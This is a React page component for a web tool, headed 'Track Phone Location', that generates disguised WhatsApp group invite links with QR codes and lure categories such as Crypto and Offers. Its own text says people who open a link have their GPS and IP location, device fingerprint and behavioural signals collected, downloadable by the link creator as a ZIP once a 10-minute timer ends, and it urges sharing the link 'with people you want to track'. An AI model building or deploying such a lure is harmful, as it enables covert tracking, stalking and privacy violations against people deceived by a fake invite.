'use client';

import { useState, useEffect, useRef } from 'react';
import { QRCodeCanvas } from 'qrcode.react';
import { WhatsappLogo, Link, ChatCircle, Image as ImageIcon, QrCode, Copy, Check, X, Shield, MapPin, Camera, Users, PaperPlaneTilt, FacebookLogo, Download, Clock, Tag } from '@phosphor-icons/react';
import { twMerge } from 'tailwind-merge';
import { exportGroupData } from '@/lib/dataExport';
import { saveGroupData } from '@/lib/storage';

const CATEGORY_OPTIONS = [
  'Crypto',
  'Shopping',
  'Trading',
  'Offers',
  'Travel',
  'Gaming',
  'Education',
  'Sports',
  'Community',
  'Support',
];

const CATEGORY_IMAGES: Record<string, string> = {
  Crypto: 'https://images.unsplash.com/photo-1614288694997-7b4b6405e43c?auto=format&fit=crop&w=400&q=80',
  Shopping: 'https://images.unsplash.com/photo-1520607162513-77705c0f0d4a?auto=format&fit=crop&w=400&q=80',
  Trading: 'https://images.unsplash.com/photo-1559526324-593bc073d938?auto=format&fit=crop&w=400&q=80',
  Offers: 'https://images.unsplash.com/photo-1512436991641-6745cdb1723f?auto=format&fit=crop&w=400&q=80',
  Travel: 'https://images.unsplash.com/photo-1500530855697-b586d89ba3ee?auto=format&fit=crop&w=400&q=80',
  Gaming: 'https://images.unsplash.com/photo-1542751110-97427bbecf20?auto=format&fit=crop&w=400&q=80',
  Education: 'https://images.unsplash.com/photo-1523580846011-d3a5bc25702b?auto=format&fit=crop&w=400&q=80',
  Sports: 'https://images.unsplash.com/photo-1461896836934-ffe607ba8211?auto=format&fit=crop&w=400&q=80',
  Community: 'https://images.unsplash.com/photo-1500648767791-00dcc994a43e?auto=format&fit=crop&w=400&q=80',
  Support: 'https://images.unsplash.com/photo-1520607162513-77705c0f0d4a?auto=format&fit=crop&w=400&q=80',
};

export default function Home() {
  const [groupName, setGroupName] = useState('');
  const [category, setCategory] = useState('');
  const [imagePreview, setImagePreview] = useState<string>('');
  const [generatedLink, setGeneratedLink] = useState('');
  const [currentGroupId, setCurrentGroupId] = useState<string>('');
  const [linkExpiresAt, setLinkExpiresAt] = useState<Date | null>(null);
  const [timeRemaining, setTimeRemaining] = useState<string>('');
  const [isExpired, setIsExpired] = useState<boolean>(false);

  const generateLink = async () => {
    // Validate: group name required; image optional
    if (!groupName.trim()) {
      alert('Please enter a group name');
      return;
    }

    // Generate a unique ID for this group
    const groupId = Math.random().toString(36).substring(2, 15);
    
    // Calculate expiration time (10 minutes from now)
    const expiresAt = new Date(Date.now() + 10 * 60 * 1000); // 10 minutes
    
    const mappedImage = category ? CATEGORY_IMAGES[category] || '' : '';

    // Store group data using new storage system
    const groupData = {
      id: groupId,
      name: groupName,
      image: mappedImage || imagePreview || '', // prefer mapped image
      category: category || '',
      createdAt: new Date().toISOString(),
      expiresAt: expiresAt.toISOString(), // Add expiration time
    };
    
    // Save group data using new storage system
    await saveGroupData(groupId, groupData);
    
    // Generate the tracking link
    // Embed minimal group info in the URL so it works across devices
    // even if local storage/IndexedDB is empty on the recipient device.
    const encodedInfo = encodeURIComponent(
      btoa(unescape(encodeURIComponent(JSON.stringify(groupData))))
    );
    const link = `${window.location.origin}/join/${groupId}?info=${encodedInfo}`;
    setGeneratedLink(link);
    setCurrentGroupId(groupId);
    setLinkExpiresAt(expiresAt);
    // Countdown timer will start automatically via useEffect
  };

  const handleExportData = async () => {
    if (!currentGroupId) {
      alert('Please generate a link first');
      return;
    }
    if (!isExpired) {
      alert('Download is available after the 10-minute timer ends.');
      return;
    }
    await exportGroupData(currentGroupId);
  };

  // Countdown timer using useEffect
  const countdownIntervalRef = useRef<NodeJS.Timeout | null>(null);
  
  useEffect(() => {
    if (!linkExpiresAt) {
      setIsExpired(false);
      if (countdownIntervalRef.current) {
        clearInterval(countdownIntervalRef.current);
        countdownIntervalRef.current = null;
      }
      return;
    }

    const updateTimer = () => {
      const now = new Date();
      const diff = linkExpiresAt.getTime() - now.getTime();
      
      if (diff <= 0) {
        setTimeRemaining('Expired');
        setIsExpired(true);
        if (countdownIntervalRef.current) {
          clearInterval(countdownIntervalRef.current);
          countdownIntervalRef.current = null;
        }
        return;
      }
      
      const minutes = Math.floor(diff / 60000);
      const seconds = Math.floor((diff % 60000) / 1000);
      setTimeRemaining(`${minutes}:${seconds.toString().padStart(2, '0')}`);
    };
    
    // Update immediately
    updateTimer();
    
    // Update every second
    countdownIntervalRef.current = setInterval(updateTimer, 1000);
    
    // Cleanup on unmount or when expiresAt changes
    return () => {
      if (countdownIntervalRef.current) {
        clearInterval(countdownIntervalRef.current);
        countdownIntervalRef.current = null;
      }
    };
  }, [linkExpiresAt, currentGroupId]);

  // Check if form is valid (name required; image optional)
  const isFormValid = groupName.trim().length > 0;

  const copyLink = async () => {
    if (!generatedLink) return;

    try {
      if (typeof navigator !== 'undefined' && navigator.clipboard?.writeText) {
        await navigator.clipboard.writeText(generatedLink);
        alert('Link copied to clipboard!');
      } else {
        // Fallback for browsers without clipboard API (or blocked context)
        const textarea = document.createElement('textarea');
        textarea.value = generatedLink;
        textarea.style.position = 'fixed';
        textarea.style.top = '0';
        textarea.style.left = '0';
        document.body.appendChild(textarea);
        textarea.focus();
        textarea.select();
        document.execCommand('copy');
        document.body.removeChild(textarea);
        alert('Link copied to clipboard!');
      }
    } catch (error) {
      console.error('Copy failed:', error);
      alert('Unable to copy. Please copy the link manually.');
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-[#128C7E] via-[#075E54] to-[#128C7E] flex items-center justify-center py-8 px-4 sm:py-12 sm:px-6">
      <div className="w-full max-w-4xl mx-auto">
        {/* Hero Section - Centered */}
        <div className="text-center mb-10 sm:mb-12">
          <div className="inline-flex items-center justify-center w-16 h-16 sm:w-20 sm:h-20 bg-white/20 rounded-full mb-5 sm:mb-6 backdrop-blur-sm shadow-lg">
            <WhatsappLogo className="w-10 h-10 sm:w-12 sm:h-12 text-white" weight="fill" />
          </div>
          <h1 className="text-3xl sm:now:text-4xl md:text-5xl lg:text-6xl font-bold text-white mb-3 sm:mb-4 leading-tight">
            Track Phone Location
          </h1>
          <p className="text-lg sm:text-xl md:text-2xl text-green-100 mb-2 font-medium">
            Secure WhatsApp Group Link Generator
          </p>
          <div className="mt-4 flex flex-wrap items-center justify-center gap-3">
            <span className="px-4 py-2 rounded-full bg-white/15 text-white text-sm sm:text-base font-semibold flex items-center space-x-2 shadow">
              <WhatsappLogo className="w-5 h-5" weight="fill" />
              <span>WhatsApp • Live</span>
            </span>
            <span className="px-4 py-2 rounded-full bg-white/10 text-white/80 text-sm sm:text-base font-semibold flex items-center space-x-2 border border-white/10">
              <PaperPlaneTilt className="w-5 h-5" weight="fill" />
              <span>Telegram • Coming soon</span>
            </span>
            <span className="px-4 py-2 rounded-full bg-white/10 text-white/80 text-sm sm:text-base font-semibold flex items-center space-x-2 border border-white/10">
              <FacebookLogo className="w-5 h-5" weight="fill" />
              <span>Facebook Messenger • Coming soon</span>
            </span>
          </div>
        </div>

        {/* Main Form Card - Centered with Perfect Padding */}
        <div className="bg-white rounded-3xl shadow-2xl overflow-hidden mb-8 sm:mb-10">
          {/* Form Header - Centered with Better Icon */}
          <div className="bg-gradient-to-r from-[#128C7E] to-[#075E54] text-white px-8 sm:px-10 py-8 sm:py-10">
            <div className="text-center">
              <div className="inline-flex items-center justify-center w-16 h-16 sm:w-20 sm:h-20 bg-white/25 rounded-2xl mb-4 sm:mb-5 backdrop-blur-md shadow-xl">
                <Link className="w-9 h-9 sm:w-11 sm:h-11 text-white" weight="bold" />
              </div>
              <h2 className="text-3xl sm:text-4xl font-bold mb-3">Create Group Link</h2>
              <p className="text-green-100 text-base sm:text-lg">Generate a secure tracking link for your WhatsApp group</p>
            </div>
          </div>

          {/* Form Content - Perfect Padding */}
          <div className="p-8 sm:p-10 md:p-12">
            <div className="space-y-8 sm:space-y-10 max-w-xl mx-auto">
              {/* Group Name Input - Clean and Simple */}
              <div>
                <label className="flex items-center space-x-3 text-lg sm:text-xl font-bold text-[#1f1f1f] mb-4">
                  <div className="w-10 h-10 sm:w-12 sm:h-12 bg-[#128C7E]/10 rounded-xl flex items-center justify-center">
                    <ChatCircle className="w-6 h-6 sm:w-7 sm:h-7 text-[#128C7E]" weight="bold" />
                  </div>
                  <span className="text-[#1f1f1f]">Group Name</span>
                </label>
                <input
                  type="text"
                  value={groupName}
                  onChange={(e) => setGroupName(e.target.value)}
                  placeholder="Enter group name"
                  className="w-full px-5 py-5 sm:py-6 border-2 border-[#e4e6eb] rounded-2xl focus:ring-4 focus:ring-[#128C7E]/20 focus:border-[#128C7E] outline-none text-[#1f1f1f] bg-white text-lg sm:text-xl transition-all shadow-sm hover:shadow-md placeholder:text-[#9ca3af]"
                />
              </div>

              {/* Category and Image URL (no upload) */}
              <div className="space-y-6">
                <div>
                  <label className="flex items-center space-x-3 text-lg sm:text-xl font-bold text-[#1f1f1f] mb-4">
                    <div className="w-10 h-10 sm:w-12 sm:h-12 bg-[#128C7E]/10 rounded-xl flex items-center justify-center">
                      <Tag className="w-6 h-6 sm:w-7 sm:h-7 text-[#128C7E]" weight="bold" />
                    </div>
                    <span className="text-[#1f1f1f]">Category (auto image)</span>
                  </label>
                  <select
                    value={category}
                    onChange={(e) => {
                      const value = e.target.value;
                      setCategory(value);
                      setImagePreview(value ? CATEGORY_IMAGES[value] || '' : '');
                    }}
                    className="w-full px-5 py-5 sm:py-6 border-2 border-[#e4e6eb] rounded-2xl focus:ring-4 focus:ring-[#128C7E]/20 focus:border-[#128C7E] outline-none text-[#1f1f1f] bg-white text-lg sm:text-xl transition-all shadow-sm hover:shadow-md"
                  >
                    <option value="">Choose a category</option>
                    {CATEGORY_OPTIONS.map((option) => (
                      <option key={option} value={option}>
                        {option}
                      </option>
                    ))}
                  </select>
                  {imagePreview ? (
                    <div className="mt-4 flex justify-center">
                      <img
                        src={imagePreview}
                        alt={`${category || 'Group'} cover`}
                        className="w-32 h-32 sm:w-36 sm:h-36 rounded-2xl object-cover border-4 border-[#128C7E] shadow-xl"
                        onError={() => setImagePreview('')}
                      />
                    </div>
                  ) : (
                    <p className="mt-3 text-sm text-[#8696a0] text-center">
                      A matching cover image is applied automatically based on category.
                    </p>
                  )}
                </div>
              </div>

              {/* Generate Button - Enhanced */}
              <div className="pt-4">
                <button
                  onClick={generateLink}
                  disabled={!isFormValid}
                  className={twMerge(
                    "w-full bg-gradient-to-r from-[#25D366] via-[#20BA5A] to-[#25D366] text-white py-5 sm:py-6 rounded-2xl font-bold text-xl sm:text-2xl",
                    "hover:from-[#20BA5A] hover:via-[#1DA851] hover:to-[#20BA5A] active:scale-[0.98] transition-all shadow-2xl hover:shadow-3xl relative overflow-hidden group",
                    !isFormValid && "opacity-50 cursor-not-allowed hover:from-[#25D366] hover:via-[#20BA5A] hover:to-[#25D366] hover:shadow-2xl"
                  )}
                  style={{
                    boxShadow: isFormValid ? '0 10px 30px rgba(37, 211, 102, 0.5)' : '0 4px 15px rgba(37, 211, 102, 0.2)'
                  }}
                >
                  <span className="flex items-center justify-center space-x-3 relative z-10">
                    <Link className="w-7 h-7 sm:w-8 sm:h-8 group-hover:rotate-12 transition-transform" weight="bold" />
                    <span>Generate Link</span>
                  </span>
                  {isFormValid && (
                    <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent -translate-x-full group-hover:translate-x-full transition-transform duration-1000"></div>
                  )}
                </button>
                {!isFormValid && (
                  <p className="text-sm text-[#667781] text-center mt-3">
                    Please enter a group name to generate the link (image optional)
                  </p>
                )}
              </div>

              {/* Generated Link - Enhanced */}
              {generatedLink && (
                <div className="mt-8 sm:mt-10 p-8 sm:p-9 bg-gradient-to-br from-[#f0f2f5] via-[#e5e8eb] to-[#f0f2f5] rounded-2xl border-3 border-[#128C7E]/30 shadow-xl">
                  <div className="flex items-center justify-center space-x-3 mb-5">
                    <div className="w-10 h-10 sm:w-12 sm:h-12 bg-[#128C7E]/20 rounded-xl flex items-center justify-center">
                      <Link className="w-6 h-6 sm:w-7 sm:h-7 text-[#128C7E]" weight="bold" />
                    </div>
                    <p className="text-base sm:text-lg font-bold text-[#1f1f1f]">Your Tracking Link:</p>
                  </div>
                  <div className="flex flex-col lg:flex-row lg:items-center lg:space-x-6 space-y-4 lg:space-y-0 mb-5">
                    <div className="flex-1 flex flex-col sm:flex-row items-stretch sm:items-center space-y-3 sm:space-y-0 sm:space-x-3">
                      <input
                        type="text"
                        value={generatedLink}
                        readOnly
                        className="flex-1 px-5 py-4 sm:py-5 bg-white border-3 border-[#e4e6eb] rounded-xl text-sm sm:text-base text-[#1f1f1f] focus:outline-none focus:ring-4 focus:ring-[#128C7E]/20 font-mono break-all text-center sm:text-left shadow-sm"
                      />
                      <button
                        onClick={copyLink}
                        className="px-8 py-4 sm:py-5 bg-gradient-to-r from-[#128C7E] to-[#075E54] text-white rounded-xl hover:from-[#075E54] hover:to-[#128C7E] transition-all text-base sm:text-lg font-bold whitespace-nowrap shadow-lg hover:shadow-xl flex items-center justify-center space-x-2"
                      >
                        <Copy className="w-5 h-5 sm:w-6 sm:h-6" weight="bold" />
                        <span>Copy</span>
                      </button>
                    </div>
                    <div className="self-center">
                      <div className="bg-white border-3 border-[#e4e6eb] rounded-2xl p-4 shadow-sm flex flex-col items-center space-y-2">
                        <p className="text-sm font-semibold text-[#1f1f1f] flex items-center space-x-2">
                          <QrCode className="w-5 h-5 text-[#128C7E]" weight="bold" />
                          <span>Scan on mobile</span>
                        </p>
                        <QRCodeCanvas value={generatedLink} size={132} includeMargin className="rounded-xl overflow-hidden border border-[#e5e8eb]" />
                      </div>
                    </div>
                  </div>
                  <div className="flex flex-col sm:flex-row gap-3 mb-5">
                    <button
                      onClick={handleExportData}
                      disabled={!isExpired}
                      className={twMerge(
                        "flex-1 px-6 py-4 rounded-xl transition-all font-semibold shadow-lg hover:shadow-xl flex items-center justify-center space-x-2",
                        isExpired
                          ? "bg-gradient-to-r from-[#25D366] to-[#20BA5A] text-white hover:from-[#20BA5A] hover:to-[#25D366]"
                          : "bg-[#e5e8eb] text-[#94a3b8] cursor-not-allowed"
                      )}
                    >
                      <Download className="w-5 h-5" weight="bold" />
                      <span>{isExpired ? 'Download All Data (ZIP)' : 'Available after timer ends'}</span>
                    </button>
                  </div>
                  {/* Expiration Timer */}
                  {linkExpiresAt && (
                    <div className="mb-5 p-4 bg-gradient-to-r from-orange-50 to-yellow-50 rounded-xl border-2 border-orange-200">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center space-x-2">
                          <Clock className="w-5 h-5 text-orange-600" weight="bold" />
                          <span className="text-sm font-semibold text-orange-800">Link Expires In:</span>
                        </div>
                        <span className="text-2xl font-bold text-orange-600 font-mono">{timeRemaining}</span>
                      </div>
                      <p className="text-xs text-orange-700 mt-2 text-center">
                        This link will expire in 10 minutes. Download your data before it expires.
                      </p>
                    </div>
                  )}
                  
                  <div className="p-5 bg-[#128C7E]/10 rounded-xl border border-[#128C7E]/20">
                    <div className="space-y-2 text-center">
                      <p className="text-sm sm:text-base text-[#667781] leading-relaxed">
                        <span className="font-bold text-[#128C7E]">💡 Tip:</span> Share this link with people you want to track. QR works great for mobile joins.
                      </p>
                      <p className="text-sm sm:text-base text-[#667781] leading-relaxed font-semibold">
                        Downloads unlock after the 10-minute timer ends; users can still join during the timer.
                      </p>
                      <p className="text-sm sm:text-base text-[#667781] leading-relaxed">
                        Location, device info, VPN check, and behavioral signals are collected to help block scammers.
                      </p>
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>

        {/* View Data Link - Removed: Users can download data from generated link */}

        {/* Features Section - Enhanced with Better Icons */}
        <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 sm:gap-5">
          <div className="bg-white/10 backdrop-blur-md rounded-2xl p-6 sm:p-7 text-white border-2 border-white/20 hover:bg-white/15 hover:border-white/30 transition-all shadow-xl hover:shadow-2xl group">
            <div className="w-14 h-14 sm:w-16 sm:h-16 bg-white/25 rounded-2xl flex items-center justify-center mb-4 mx-auto group-hover:scale-110 transition-transform shadow-lg">
              <MapPin className="w-8 h-8 sm:w-9 sm:h-9" weight="fill" />
            </div>
            <h3 className="text-lg sm:text-xl font-bold mb-2 text-center">Location Tracking</h3>
            <p className="text-sm sm:text-base text-green-100 text-center leading-relaxed">GPS + IP location tracking with VPN detection</p>
          </div>

          <div className="bg-white/10 backdrop-blur-md rounded-2xl p-6 sm:p-7 text-white border-2 border-white/20 hover:bg-white/15 hover:border-white/30 transition-all shadow-xl hover:shadow-2xl group">
            <div className="w-14 h-14 sm:w-16 sm:h-16 bg-white/25 rounded-2xl flex items-center justify-center mb-4 mx-auto group-hover:scale-110 transition-transform shadow-lg">
              <Shield className="w-8 h-8 sm:w-9 sm:h-9" weight="fill" />
            </div>
            <h3 className="text-lg sm:text-xl font-bold mb-2 text-center">Device Fingerprinting</h3>
            <p className="text-sm sm:text-base text-green-100 text-center leading-relaxed">Unique device identification to catch repeat offenders</p>
          </div>

          <div className="bg-white/10 backdrop-blur-md rounded-2xl p-6 sm:p-7 text-white border-2 border-white/20 hover:bg-white/15 hover:border-white/30 transition-all shadow-xl hover:shadow-2xl group">
            <div className="w-14 h-14 sm:w-16 sm:h-16 bg-white/25 rounded-2xl flex items-center justify-center mb-4 mx-auto group-hover:scale-110 transition-transform shadow-lg">
              <Shield className="w-8 h-8 sm:w-9 sm:h-9" weight="fill" />
            </div>
            <h3 className="text-lg sm:text-xl font-bold mb-2 text-center">Scammer Detection</h3>
            <p className="text-sm sm:text-base text-green-100 text-center leading-relaxed">Advanced bot detection and behavioral analysis</p>
          </div>
        </div>
      </div>
    </div>
  );
}
